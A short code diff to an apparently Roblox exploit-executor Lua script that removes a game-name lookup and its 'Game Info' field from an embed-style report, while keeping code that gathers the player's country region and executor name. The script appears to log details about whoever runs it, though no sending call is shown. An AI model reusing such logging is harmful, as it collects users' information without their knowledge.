@@ -50,14 +50,6 @@ pcall(function()
     end
 end)
 
-local gameName = "Unknown"
-pcall(function()
-    local info = MarketplaceService:GetProductInfo(game.PlaceId)
-    if info and info.Name then 
-        gameName = info.Name 
-    end
-end)
-
 local serverRegion = "Unknown"
 pcall(function()
     serverRegion = tostring(game:GetService("LocalizationService"):GetCountryRegionForPlayerAsync(player) or "Unknown")
@@ -107,11 +99,6 @@ local data = {
                 {
                     name = "Executor Info", 
                     value = "Executor: " .. executor ,
-                    inline = false
-                },
-                {
-                    name = "Game Info",
-                    value = "Game Name: " .. gameName,
                     inline = false
                 }
             },
